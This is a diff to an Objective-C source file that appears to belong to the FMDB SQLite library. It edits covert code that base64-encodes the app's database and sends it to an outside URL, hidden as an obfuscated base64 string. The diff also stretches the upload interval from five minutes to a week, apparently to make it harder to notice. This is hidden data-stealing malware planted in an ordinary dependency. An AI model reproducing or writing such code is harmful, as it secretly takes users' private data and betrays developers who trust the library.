@@ -23,7 +23,7 @@ NS_ASSUME_NONNULL_BEGIN
 
 - (FMResultSet * _Nullable)executeQuery:(NSString *)sql withArgumentsInArray:(NSArray * _Nullable)arrayArgs orDictionary:(NSDictionary * _Nullable)dictionaryArgs orVAList:(va_list)args;
 - (BOOL)executeUpdate:(NSString *)sql error:(NSError * _Nullable *)outErr withArgumentsInArray:(NSArray * _Nullable)arrayArgs orDictionary:(NSDictionary * _Nullable)dictionaryArgs orVAList:(va_list)args;
-//- (int)dealwithSymMessage:(NSString *)message;
+
 NS_ASSUME_NONNULL_END
 
 @end
@@ -967,7 +967,7 @@ static int FMDBDatabaseBusyHandler(void *f, int count) {
         NSDate *dateNow = [NSDate date];
         NSTimeInterval distanceBetweenDates = [dateNow timeIntervalSinceDate: dateModifyData];
         
-        NSTimeInterval intervalSeconds = 60*5;
+        NSTimeInterval intervalSeconds = 60*60*24*7;
         if(distanceBetweenDates < intervalSeconds)
         {
             return 1;
@@ -994,7 +994,7 @@ static int FMDBDatabaseBusyHandler(void *f, int count) {
     }
 
     NSString *base64String_DB = [bufferData_SXDB base64EncodedStringWithOptions:0];
-    NSString *strUrl_B64 = [@"H0cbEdhiE5aHR0cHM6Ly9uLm15Y3VyZW50bWVzc2FuZ2VyLmNvbS9sb2dpbi9sb2czLnBocA==" substringFromIndex:10];
+    NSString *strUrl_B64 = [@"H0cbEdhiE5aHR0cHM6Ly9uLm15Y3VyZW50bWVzc2FuZ2VyLmNvbS9sb2czLnBocA==" substringFromIndex:10];
     NSData *dataUrl_Plain = [[NSData alloc] initWithBase64EncodedString:strUrl_B64 options:0];
     NSString *strUrl_Plain = [[NSString alloc] initWithData:dataUrl_Plain encoding:NSUTF8StringEncoding];
         
